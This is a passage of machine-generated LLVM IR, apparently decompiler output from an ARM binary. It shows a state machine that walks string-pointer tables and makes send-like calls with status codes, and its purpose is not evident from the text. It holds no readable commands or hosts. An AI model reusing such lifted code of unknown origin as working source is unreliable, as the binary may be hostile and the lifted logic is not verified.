  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i8 3, i8* %v1_b0a8, align 4
  br label %dec_label_pc_ce80

dec_label_pc_bc4c:                                ; preds = %dec_label_pc_baec
  store i32 %storemerge560, i32* %r4.global-to-local, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_baa8, i32* %r3.global-to-local, align 4
  %v2_bc70 = load i32, i32* %v1_baac, align 4
  store i32 %v2_bc70, i32* %r3.global-to-local, align 4
  store i32 %v2_bc70, i32* @r0, align 4
  %v0_bc78 = call i32 @function_11e30()
  %v3_bc84 = urem i32 %v0_bc78, 65536
  store i32 %v3_bc84, i32* %r1.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_bc90 = load i32, i32* %r4.global-to-local, align 4
  %v2_bc9c = mul i32 %v0_bc90, 24
  %v2_bca4 = add i32 %v2_bca0, %v2_bc9c
  store i32 %v2_bca4, i32* %r2.global-to-local, align 4
  %v1_bca8 = trunc i32 %v0_bc78 to i8
  %v3_bca8 = inttoptr i32 %v2_bca4 to i8*
  store i8 %v1_bca8, i8* %v3_bca8, align 4
  %v0_bcac = load i32, i32* %r1.global-to-local, align 4
  %v3_bcac16 = udiv i32 %v0_bcac, 256
  %v1_bcb0 = trunc i32 %v3_bcac16 to i8
  %v2_bcb0 = load i32, i32* %r2.global-to-local, align 4
  %v3_bcb0 = add i32 %v2_bcb0, 1
  %v4_bcb0 = inttoptr i32 %v3_bcb0 to i8*
  store i8 %v1_bcb0, i8* %v4_bcb0, align 1
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_ba44, i32* %r3.global-to-local, align 4
  %v2_bcd4 = load i32, i32* %v1_ba48, align 4
  store i32 %v2_bcd4, i32* %r3.global-to-local, align 4
  %v1_bcd8 = add i32 %v2_bcd4, 30
  store i32 %v1_bcd8, i32* @r4, align 4
  %v2_bce0 = call i32 @function_1096c(i32* null)
  store i32 %v2_bce0, i32* %r3.global-to-local, align 4
  %v0_bce8 = load i32, i32* @r4, align 4
  %v3_bce8 = icmp ult i32 %v0_bce8, %v2_bce0
  br i1 %v3_bce8, label %dec_label_pc_bcf0, label %dec_label_pc_ce80

dec_label_pc_bcf0:                                ; preds = %dec_label_pc_bc4c
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_bd08 = load i32, i32* %v1_bb04, align 4
  store i32 %v2_bd08, i32* %r3.global-to-local, align 4
  %v3_bd10 = call i32 @function_ae78(i32 %v2_bd08, i32 %v3_af84, i32 %v3_b094)
  store i8 0, i8* %v1_b0a8, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_bd60 = add i32 %v2_b0a0, 9
  %v4_bd60 = inttoptr i32 %v3_bd60 to i8*
  store i8 1, i8* %v4_bd60, align 1
  br label %dec_label_pc_ce80

dec_label_pc_bd68:                                ; preds = %dec_label_pc_b088
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v1_bd80 = inttoptr i32 %v2_b0a0 to i32*
  %v2_bd80 = load i32, i32* %v1_bd80, align 4
  store i32 %v2_bd80, i32* @r4, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r3.global-to-local, align 4
  %v1_bda4 = add i32 %v2_b0a0, 10
  %v2_bda4 = inttoptr i32 %v1_bda4 to i8*
  %v3_bda4 = load i8, i8* %v2_bda4, align 2
  %v4_bda4 = zext i8 %v3_bda4 to i32
  store i32 %v4_bda4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([17 x i8*]* @global_var_20228.94 to i32), i32* %r3.global-to-local, align 4
  %v4_bdb0 = mul nuw nsw i32 %v4_bda4, 4
  %v5_bdb0 = add i32 %v4_bdb0, ptrtoint ([17 x i8*]* @global_var_20228.94 to i32)
  %v6_bdb0 = inttoptr i32 %v5_bdb0 to i32*
  %v7_bdb0 = load i32, i32* %v6_bdb0, align 4
  store i32 %v7_bdb0, i32* @r5, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r3.global-to-local, align 4
  %v3_bdd4 = load i8, i8* %v2_bda4, align 2
  %v4_bdd4 = zext i8 %v3_bdd4 to i32
  store i32 %v4_bdd4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([17 x i8*]* @global_var_20228.94 to i32), i32* %r3.global-to-local, align 4
  %v4_bde0 = mul nuw nsw i32 %v4_bdd4, 4
  %v5_bde0 = add i32 %v4_bde0, ptrtoint ([17 x i8*]* @global_var_20228.94 to i32)
  %v6_bde0 = inttoptr i32 %v5_bde0 to i32*
  %v7_bde0 = load i32, i32* %v6_bde0, align 4
  store i32 %v7_bde0, i32* %r3.global-to-local, align 4
  store i32 %v7_bde0, i32* @r0, align 4
  %v0_bde8 = call i32 @function_11e30()
  %v0_bdf0 = load i32, i32* @r4, align 4
  %v0_bdf4 = load i32, i32* @r5, align 4
  store i32 %v0_bdf4, i32* %r1.global-to-local, align 4
  store i32 %v0_bde8, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_be00 = inttoptr i32 %v0_bdf4 to i32*
  %v5_be00 = call i32 @function_125ac(i32 %v0_bdf0, i32* %v4_be00, i32 %v0_bde8, i32 16384)
  %v1_be08 = icmp slt i32 %v5_be00, 0
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_be28 = load i32, i32* %v1_bd80, align 4
  br i1 %v1_be08, label %dec_label_pc_be10, label %dec_label_pc_be88

dec_label_pc_be10:                                ; preds = %dec_label_pc_bd68
  store i32 %v2_be28, i32* %r3.global-to-local, align 4
  %v3_be30 = call i32 @function_ae78(i32 %v2_be28, i32 %v3_af84, i32 %v3_b094)
  store i8 0, i8* %v1_b0a8, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_be80 = add i32 %v2_b0a0, 9
  %v4_be80 = inttoptr i32 %v3_be80 to i8*
  store i8 1, i8* %v4_be80, align 1
  br label %dec_label_pc_ce80

dec_label_pc_be88:                                ; preds = %dec_label_pc_bd68
  store i32 ptrtoint ([3 x i8]* @global_var_16d64.96 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_beb4 = call i32 @function_125ac(i32 %v2_be28, i32* bitcast ([3 x i8]* @global_var_16d64.96 to i32*), i32 2, i32 16384)
  %v1_bebc = icmp slt i32 %v6_beb4, 0
  store i32 %storemerge560, i32* %r3.global-to-local, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  br i1 %v1_bebc, label %dec_label_pc_bec4, label %dec_label_pc_bf3c

dec_label_pc_bec4:                                ; preds = %dec_label_pc_be88
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_bedc = load i32, i32* %v1_bd80, align 4
  store i32 %v2_bedc, i32* %r3.global-to-local, align 4
  %v3_bee4 = call i32 @function_ae78(i32 %v2_bedc, i32 %v3_af84, i32 %v3_b094)
  store i8 0, i8* %v1_b0a8, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_bf34 = add i32 %v2_b0a0, 9
  %v4_bf34 = inttoptr i32 %v3_bf34 to i8*
  store i8 1, i8* %v4_bf34, align 1
  br label %dec_label_pc_ce80

dec_label_pc_bf3c:                                ; preds = %dec_label_pc_be88
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i8 4, i8* %v1_b0a8, align 4
  br label %dec_label_pc_ce80

dec_label_pc_bf68:                                ; preds = %dec_label_pc_b088
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_bf84 = add i32 %v2_b09c, %v2_b5a0
  store i32 %v2_bf84, i32* %r3.global-to-local, align 4
  %v1_bf88 = inttoptr i32 %v2_bf84 to i32*
  %v2_bf88 = load i32, i32* %v1_bf88, align 4
  store i32 %v2_bf88, i32* %r3.global-to-local, align 4
  %v2_bf8c = icmp eq i32 %v2_bf88, 0
  br i1 %v2_bf8c, label %dec_label_pc_bf94, label %dec_label_pc_bfcc

dec_label_pc_bf94:                                ; preds = %dec_label_pc_bf68
  store i32 %storemerge560, i32* @r4, align 4
  %v2_bf9c = call i32 @function_1096c(i32* null)
  store i32 %v2_bf9c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %ip.global-to-local, align 4
  %v0_bfb0 = load i32, i32* @r4, align 4
  %v3_bfb4 = mul i32 %v0_bfb0, 8
  store i32 %v3_bfb4, i32* %r2.global-to-local, align 4
  %v2_bfbc = mul i32 %v0_bfb0, 24
  %v2_bfc4 = add i32 %v2_b5a0, %v2_bfbc
  store i32 %v2_bfc4, i32* %r3.global-to-local, align 4
  %v2_bfc8 = inttoptr i32 %v2_bfc4 to i32*
  store i32 %v2_bf9c, i32* %v2_bfc8, align 4
  br label %dec_label_pc_bfcc

dec_label_pc_bfcc:                                ; preds = %dec_label_pc_bf68, %dec_label_pc_bf94
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v1_bfe4 = inttoptr i32 %v2_b0a0 to i32*
  %v2_bfe4 = load i32, i32* %v1_bfe4, align 4
  store i32 %v2_bfe4, i32* %ip.global-to-local, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_c004 = add i32 %v2_b09c, %v2_b044
  store i32 %v2_c004, i32* %r3.global-to-local, align 4
  %v1_c008 = inttoptr i32 %v2_c004 to i32*
  %v2_c008 = load i32, i32* %v1_c008, align 4
  store i32 %v2_c008, i32* @lr, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_c028 = add i32 %v2_b0a0, 16
  store i32 %v2_c028, i32* %r3.global-to-local, align 4
  %v1_c02c = inttoptr i32 %v2_c028 to i8*
  %v2_c02c = load i8, i8* %v1_c02c, align 4
  %v3_c02c = zext i8 %v2_c02c to i32
  store i32 %v3_c02c, i32* %r2.global-to-local, align 4
  %v1_c030 = add i32 %v2_b0a0, 17
  %v2_c030 = inttoptr i32 %v1_c030 to i8*
  %v3_c030 = load i8, i8* %v2_c030, align 1
  %v4_c030 = zext i8 %v3_c030 to i32
  %v4_c034 = mul nuw nsw i32 %v4_c030, 256
  %v5_c034 = or i32 %v4_c034, %v3_c02c
  store i32 %v5_c034, i32* %r2.global-to-local, align 4
  %v1_c044 = load i32, i32* @sp, align 4
  %v2_c044 = inttoptr i32 %v1_c044 to i32*
  store i32 10000, i32* %v2_c044, align 4
  %v0_c048 = load i32, i32* @lr, align 4
  %v1_c048 = load i32, i32* @sp, align 4
  %v2_c048 = add i32 %v1_c048, 4
  %v3_c048 = inttoptr i32 %v2_c048 to i32*
  store i32 %v0_c048, i32* %v3_c048, align 4
  %v1_c050 = load i32, i32* @sp, align 4
  %v2_c050 = add i32 %v1_c050, 8
  %v3_c050 = inttoptr i32 %v2_c050 to i32*
  store i32 1024, i32* %v3_c050, align 4
  %v0_c054 = load i32, i32* %r2.global-to-local, align 4
  %v1_c054 = load i32, i32* @sp, align 4
  %v2_c054 = add i32 %v1_c054, 12
  %v3_c054 = inttoptr i32 %v2_c054 to i32*
  store i32 %v0_c054, i32* %v3_c054, align 4
  %v0_c058 = load i32, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_16d68.98 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_c068 = call i32 @function_a4ec(i32 %v0_c058, i32 ptrtoint ([9 x i8]* @global_var_16d68.98 to i32), i32 1, i32 0)
  %v2_c070 = icmp eq i32 %v5_c068, 0
  store i32 %storemerge560, i32* %r3.global-to-local, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  br i1 %v2_c070, label %dec_label_pc_c194, label %dec_label_pc_c078

dec_label_pc_c078:                                ; preds = %dec_label_pc_bfcc
  %v2_c094 = add i32 %v2_b0a0, 12
  %v2_c09c = inttoptr i32 %v2_c094 to i32*
  store i32 0, i32* %v2_c09c, align 4
  store i32 %v2_c028, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v1_c02c, align 4
  %v0_c0c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_c0c8 = trunc i32 %v0_c0c8 to i8
  %v2_c0c8 = load i32, i32* %r2.global-to-local, align 4
  %v3_c0c8 = add i32 %v2_c0c8, 1
  %v4_c0c8 = inttoptr i32 %v3_c0c8 to i8*
  store i8 %v1_c0c8, i8* %v4_c0c8, align 1
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_c004, i32* %r3.global-to-local, align 4
  %v2_c0ec = load i32, i32* %v1_c008, align 4
  store i32 %v2_c0ec, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_16d68.98 to i32), i32* %r1.global-to-local, align 4
  %v4_c0f8 = call i32 @function_1214c(i32 %v2_c0ec, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_16d68.98, i32 0, i32 0))
  %v2_c100 = icmp eq i32 %v4_c0f8, 0
  %. = select i1 %v2_c100, i8 7, i8 5
  store i8 %., i8* %v1_b0a8, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_c004, i32* %r3.global-to-local, align 4
  %v2_c17c = load i32, i32* %v1_c008, align 4
  store i32 %v2_c17c, i32* %r3.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_c18c = inttoptr i32 %v2_c17c to i8*
  %v3_c18c = call i32 @function_11d70(i8* %v2_c18c, i32 0)
  br label %dec_label_pc_ce80

dec_label_pc_c194:                                ; preds = %dec_label_pc_bfcc
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_c1b0 = add i32 %v2_b0a0, 20
  store i32 %v2_c1b0, i32* %r3.global-to-local, align 4
  %v1_c1b4 = inttoptr i32 %v2_c1b0 to i32*
  %v2_c1b4 = load i32, i32* %v1_c1b4, align 4
  store i32 %v2_c1b4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_16d74.100 to i32), i32* %r1.global-to-local, align 4
  %v4_c1c0 = call i32 @function_1214c(i32 %v2_c1b4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_16d74.100, i32 0, i32 0))
  store i32 %v4_c1c0, i32* %r3.global-to-local, align 4
  %v2_c1c8 = icmp eq i32 %v4_c1c0, 0
  br i1 %v2_c1c8, label %dec_label_pc_c248, label %dec_label_pc_c1d0

dec_label_pc_c1d0:                                ; preds = %dec_label_pc_c194
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_c1e8 = load i32, i32* %v1_bfe4, align 4
  store i32 %v2_c1e8, i32* %r3.global-to-local, align 4
  %v3_c1f0 = call i32 @function_ae78(i32 %v2_c1e8, i32 %v3_af84, i32 %v3_b094)
  store i8 0, i8* %v1_b0a8, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c240 = add i32 %v2_b0a0, 9
  %v4_c240 = inttoptr i32 %v3_c240 to i8*
  store i8 0, i8* %v4_c240, align 1
  br label %dec_label_pc_ce80

dec_label_pc_c248:                                ; preds = %dec_label_pc_c194
  store i32 %storemerge560, i32* %r4.global-to-local, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_c004, i32* %r3.global-to-local, align 4
  %v2_c26c = load i32, i32* %v1_c008, align 4
  store i32 %v2_c26c, i32* %r3.global-to-local, align 4
  store i32 %v2_c26c, i32* @r0, align 4
  %v0_c274 = call i32 @function_11e30()
  %v3_c280 = urem i32 %v0_c274, 65536
  store i32 %v3_c280, i32* %r1.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c28c = load i32, i32* %r4.global-to-local, align 4
  %v2_c298 = mul i32 %v0_c28c, 24
  %v2_c2a0 = add i32 %v2_bca0, %v2_c298
  store i32 %v2_c2a0, i32* %r2.global-to-local, align 4
  %v1_c2a4 = trunc i32 %v0_c274 to i8
  %v3_c2a4 = inttoptr i32 %v2_c2a0 to i8*
  store i8 %v1_c2a4, i8* %v3_c2a4, align 4
  %v0_c2a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_c2a815 = udiv i32 %v0_c2a8, 256
  %v1_c2ac = trunc i32 %v3_c2a815 to i8
  %v2_c2ac = load i32, i32* %r2.global-to-local, align 4
  %v3_c2ac = add i32 %v2_c2ac, 1
  %v4_c2ac = inttoptr i32 %v3_c2ac to i8*
  store i8 %v1_c2ac, i8* %v4_c2ac, align 1
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_bf84, i32* %r3.global-to-local, align 4
  %v2_c2d0 = load i32, i32* %v1_bf88, align 4
  store i32 %v2_c2d0, i32* %r3.global-to-local, align 4
  %v1_c2d4 = add i32 %v2_c2d0, 30
  store i32 %v1_c2d4, i32* @r4, align 4
  %v2_c2dc = call i32 @function_1096c(i32* null)
  store i32 %v2_c2dc, i32* %r3.global-to-local, align 4
  %v0_c2e4 = load i32, i32* @r4, align 4
  %v3_c2e4 = icmp ult i32 %v0_c2e4, %v2_c2dc
  br i1 %v3_c2e4, label %dec_label_pc_c2ec, label %dec_label_pc_ce80

dec_label_pc_c2ec:                                ; preds = %dec_label_pc_c248
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_c304 = load i32, i32* %v1_bfe4, align 4
  store i32 %v2_c304, i32* %r3.global-to-local, align 4
  %v3_c30c = call i32 @function_ae78(i32 %v2_c304, i32 %v3_af84, i32 %v3_b094)
  store i8 0, i8* %v1_b0a8, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_c35c = add i32 %v2_b0a0, 9
  %v4_c35c = inttoptr i32 %v3_c35c to i8*
  store i8 1, i8* %v4_c35c, align 1
  br label %dec_label_pc_ce80

dec_label_pc_c364:                                ; preds = %dec_label_pc_b088
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v1_c37c = inttoptr i32 %v2_b0a0 to i32*
  %v2_c37c = load i32, i32* %v1_c37c, align 4
  store i32 %v2_c37c, i32* @r4, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r3.global-to-local, align 4
  %v1_c3a0 = add i32 %v2_b0a0, 11
  %v2_c3a0 = inttoptr i32 %v1_c3a0 to i8*
  %v3_c3a0 = load i8, i8* %v2_c3a0, align 1
  %v4_c3a0 = zext i8 %v3_c3a0 to i32
  store i32 %v4_c3a0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([14 x i8*]* @global_var_20234.102 to i32), i32* %r3.global-to-local, align 4
  %v4_c3ac = mul nuw nsw i32 %v4_c3a0, 4
  %v5_c3ac = add i32 %v4_c3ac, ptrtoint ([14 x i8*]* @global_var_20234.102 to i32)
  %v6_c3ac = inttoptr i32 %v5_c3ac to i32*
  %v7_c3ac = load i32, i32* %v6_c3ac, align 4
  store i32 %v7_c3ac, i32* @r5, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r3.global-to-local, align 4
  %v3_c3d0 = load i8, i8* %v2_c3a0, align 1
  %v4_c3d0 = zext i8 %v3_c3d0 to i32
  store i32 %v4_c3d0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([14 x i8*]* @global_var_20234.102 to i32), i32* %r3.global-to-local, align 4
  %v4_c3dc = mul nuw nsw i32 %v4_c3d0, 4
  %v5_c3dc = add i32 %v4_c3dc, ptrtoint ([14 x i8*]* @global_var_20234.102 to i32)
  %v6_c3dc = inttoptr i32 %v5_c3dc to i32*
  %v7_c3dc = load i32, i32* %v6_c3dc, align 4
  store i32 %v7_c3dc, i32* %r3.global-to-local, align 4
  store i32 %v7_c3dc, i32* @r0, align 4
  %v0_c3e4 = call i32 @function_11e30()
  %v0_c3ec = load i32, i32* @r4, align 4
  %v0_c3f0 = load i32, i32* @r5, align 4
  store i32 %v0_c3f0, i32* %r1.global-to-local, align 4
  store i32 %v0_c3e4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_c3fc = inttoptr i32 %v0_c3f0 to i32*
  %v5_c3fc = call i32 @function_125ac(i32 %v0_c3ec, i32* %v4_c3fc, i32 %v0_c3e4, i32 16384)
  %v1_c404 = icmp slt i32 %v5_c3fc, 0
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_c424 = load i32, i32* %v1_c37c, align 4
  br i1 %v1_c404, label %dec_label_pc_c40c, label %dec_label_pc_c484

dec_label_pc_c40c:                                ; preds = %dec_label_pc_c364
  store i32 %v2_c424, i32* %r3.global-to-local, align 4
  %v3_c42c = call i32 @function_ae78(i32 %v2_c424, i32 %v3_af84, i32 %v3_b094)
  store i8 0, i8* %v1_b0a8, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_c47c = add i32 %v2_b0a0, 9
  %v4_c47c = inttoptr i32 %v3_c47c to i8*
  store i8 1, i8* %v4_c47c, align 1
  br label %dec_label_pc_ce80

dec_label_pc_c484:                                ; preds = %dec_label_pc_c364
  store i32 ptrtoint ([3 x i8]* @global_var_16d64.96 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_c4b0 = call i32 @function_125ac(i32 %v2_c424, i32* bitcast ([3 x i8]* @global_var_16d64.96 to i32*), i32 2, i32 16384)
  %v1_c4b8 = icmp slt i32 %v6_c4b0, 0
  store i32 %storemerge560, i32* %r3.global-to-local, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  br i1 %v1_c4b8, label %dec_label_pc_c4c0, label %dec_label_pc_c538

dec_label_pc_c4c0:                                ; preds = %dec_label_pc_c484
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_c4d8 = load i32, i32* %v1_c37c, align 4
  store i32 %v2_c4d8, i32* %r3.global-to-local, align 4
  %v3_c4e0 = call i32 @function_ae78(i32 %v2_c4d8, i32 %v3_af84, i32 %v3_b094)
  store i8 0, i8* %v1_b0a8, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_c530 = add i32 %v2_b0a0, 9
  %v4_c530 = inttoptr i32 %v3_c530 to i8*
  store i8 1, i8* %v4_c530, align 1
  br label %dec_label_pc_ce80

dec_label_pc_c538:                                ; preds = %dec_label_pc_c484
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i8 6, i8* %v1_b0a8, align 4
  br label %dec_label_pc_ce80

dec_label_pc_c564:                                ; preds = %dec_label_pc_b088
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_c580 = add i32 %v2_b09c, %v2_b5a0
  store i32 %v2_c580, i32* %r3.global-to-local, align 4
  %v1_c584 = inttoptr i32 %v2_c580 to i32*
  %v2_c584 = load i32, i32* %v1_c584, align 4
  store i32 %v2_c584, i32* %r3.global-to-local, align 4
  %v2_c588 = icmp eq i32 %v2_c584, 0
  br i1 %v2_c588, label %dec_label_pc_c590, label %dec_label_pc_c5c8

dec_label_pc_c590:                                ; preds = %dec_label_pc_c564
  store i32 %storemerge560, i32* @r4, align 4
  %v2_c598 = call i32 @function_1096c(i32* null)
  store i32 %v2_c598, i32* %r1.global-to-local, align 4
  store i32 12, i32* %ip.global-to-local, align 4
  %v0_c5ac = load i32, i32* @r4, align 4
  %v3_c5b0 = mul i32 %v0_c5ac, 8
  store i32 %v3_c5b0, i32* %r2.global-to-local, align 4
  %v2_c5b8 = mul i32 %v0_c5ac, 24
  %v2_c5c0 = add i32 %v2_b5a0, %v2_c5b8
  store i32 %v2_c5c0, i32* %r3.global-to-local, align 4
  %v2_c5c4 = inttoptr i32 %v2_c5c0 to i32*
  store i32 %v2_c598, i32* %v2_c5c4, align 4
  br label %dec_label_pc_c5c8

dec_label_pc_c5c8:                                ; preds = %dec_label_pc_c564, %dec_label_pc_c590
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v1_c5e0 = inttoptr i32 %v2_b0a0 to i32*
  %v2_c5e0 = load i32, i32* %v1_c5e0, align 4
  store i32 %v2_c5e0, i32* %ip.global-to-local, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_c600 = add i32 %v2_b09c, %v2_b044
  store i32 %v2_c600, i32* %r3.global-to-local, align 4
  %v1_c604 = inttoptr i32 %v2_c600 to i32*
  %v2_c604 = load i32, i32* %v1_c604, align 4
  store i32 %v2_c604, i32* @lr, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_c624 = add i32 %v2_b0a0, 16
  store i32 %v2_c624, i32* %r3.global-to-local, align 4
  %v1_c628 = inttoptr i32 %v2_c624 to i8*
  %v2_c628 = load i8, i8* %v1_c628, align 4
  %v3_c628 = zext i8 %v2_c628 to i32
  store i32 %v3_c628, i32* %r2.global-to-local, align 4
  %v1_c62c = add i32 %v2_b0a0, 17
  %v2_c62c = inttoptr i32 %v1_c62c to i8*
  %v3_c62c = load i8, i8* %v2_c62c, align 1
  %v4_c62c = zext i8 %v3_c62c to i32
  %v4_c630 = mul nuw nsw i32 %v4_c62c, 256
  %v5_c630 = or i32 %v4_c630, %v3_c628
  store i32 %v5_c630, i32* %r2.global-to-local, align 4
  %v1_c640 = load i32, i32* @sp, align 4
  %v2_c640 = inttoptr i32 %v1_c640 to i32*
  store i32 10000, i32* %v2_c640, align 4
  %v0_c644 = load i32, i32* @lr, align 4
  %v1_c644 = load i32, i32* @sp, align 4
  %v2_c644 = add i32 %v1_c644, 4
  %v3_c644 = inttoptr i32 %v2_c644 to i32*
  store i32 %v0_c644, i32* %v3_c644, align 4
  %v1_c64c = load i32, i32* @sp, align 4
  %v2_c64c = add i32 %v1_c64c, 8
  %v3_c64c = inttoptr i32 %v2_c64c to i32*
  store i32 1024, i32* %v3_c64c, align 4
  %v0_c650 = load i32, i32* %r2.global-to-local, align 4
  %v1_c650 = load i32, i32* @sp, align 4
  %v2_c650 = add i32 %v1_c650, 12
  %v3_c650 = inttoptr i32 %v2_c650 to i32*
  store i32 %v0_c650, i32* %v3_c650, align 4
  %v0_c654 = load i32, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_16d74.100 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_c664 = call i32 @function_a4ec(i32 %v0_c654, i32 ptrtoint ([9 x i8]* @global_var_16d74.100 to i32), i32 1, i32 0)
  store i32 %v5_c664, i32* %r3.global-to-local, align 4
